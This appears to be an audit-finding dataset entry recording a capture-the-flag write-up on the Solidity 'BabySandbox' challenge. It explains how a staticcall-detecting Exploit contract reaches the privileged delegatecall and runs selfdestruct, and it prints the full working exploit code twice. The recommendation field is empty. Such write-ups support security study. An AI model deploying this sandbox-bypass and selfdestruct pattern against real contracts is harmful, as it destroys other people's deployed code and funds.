# [C] BabySandbox Selfdestruct

## Summary
Severity: Critical
Contest weight: 0.0000
Dataset id: 23269
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The challenge consists of two contracts, `Setup.sol` and `BabySandbox.sol`. `Setup` deploys `BabySandbox` and provides an `isSolved()` view function that returns `true` when the code size of the deployed `BabySandbox` contract becomes zero, indicating it has been self‑destructed.

`BabySandbox` contains a single function `run(address code)` written in inline assembly:

```solidity
pragma solidity 0.7.0;

contract BabySandbox {
    function run(address code) external payable {
        assembly {
            // if we're calling ourselves, perform the privileged delegatecall
            if eq(caller(), address()) {
                switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)
                    case 0 {
                        returndatacopy(0x00, 0x00, returndatasize())
                        revert(0x00, returndatasize())
                    }
                    case 1 {
                        returndatacopy(0x00, 0x00, returndatasize())
                        return(0x00, returndatasize())
                    }
            }
            
            // ensure enough gas
            if lt(gas(), 0xf000) {
                revert(0x00, 0x00)
            }
            
            // load calldata
            calldatacopy(0x00, 0x00, calldatasize())
            
            // run using staticcall
            // if this fails, then the code is malicious because it tried to change state
            if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0)) {
                revert(0x00, 0x00)
            }
            
            // if we got here, the code wasn't malicious
            // run without staticcall since it's safe
            switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)
                case 0 {
                    returndatacopy(0x00, 0x00, returndatasize())
                    // revert(0x00, returndatasize())
                }
                case 1 {
                    returndatacopy(0x00, 0x00, returndatasize())
                    return(0x00, returndatasize())
                }
        }
    }
}
```

The logic is:

1. If the contract calls itself (`caller() == address()`), it performs a privileged `delegatecall` to the supplied `code` address.
2. Otherwise, it ensures sufficient gas, copies calldata, and executes a `staticcall` to itself. If the static call fails (indicating state‑changing behavior), it reverts.
3. If the static call succeeds, it proceeds with a normal `call` to itself, returning any data.

Because the privileged `delegatecall` is only reachable when the contract calls itself, an attacker can supply a contract that, when delegatecalled, executes a `selfdestruct`, thereby reducing the bytecode size of `BabySandbox` to zero and satisfying `isSolved()`.

The write‑up also includes a helper contract `CallDetector` demonstrating how a contract can detect whether it was invoked via `staticcall` or a normal call, and an exploit contract that leverages this behavior:

```solidity
contract Exploit {
    BabySandbox immutable babySandbox;
    address immutable exploit;
    constructor(BabySandbox _babySandbox) {
        babySandbox = _babySandbox;
        // Save actual exploit address since it's not accessible during delegate-calls.
        exploit = address(this);
    }
    function pwn() external {
        babySandbox.run(address(this));
    }
    // The delegate-call is made without calldata, so fallback will be triggered.
    fallback() external {
        (bool success, ) = exploit.call(abi.encodeWithSelector(this.stateChangingAction.selector));
        if (success) {
            selfdestruct(payable(address(0x0)));
        }
    }
    event Ping();
    function stateChangingAction() external {
        emit Ping();
    }
}
```

When `pwn()` is called, `babySandbox.run(address(this))` triggers the privileged delegatecall to the exploit contract. The exploit’s fallback executes a normal call to its own `stateChangingAction`, which succeeds only when not under a staticcall. Upon success, it calls `selfdestruct`, destroying the `BabySandbox` contract’s bytecode.

## Proof of Concept
```solidity
contract Exploit {
    BabySandbox immutable babySandbox;
    address immutable exploit;
    constructor(BabySandbox _babySandbox) {
        babySandbox = _babySandbox;
        // Save actual exploit address since it's not accessible during delegate-calls.
        exploit = address(this);
    }
    function pwn() external {
        babySandbox.run(address(this));
    }
    // The delegate-call is made without calldata, so fallback will be triggered.
    fallback() external {
        (bool success, ) = exploit.call(abi.encodeWithSelector(this.stateChangingAction.selector));
        if (success) {
            selfdestruct(payable(address(0x0)));
        }
    }
    event Ping();
    function stateChangingAction() external {
        emit Ping();
    }
}
```

## Recommendation
Information not provided
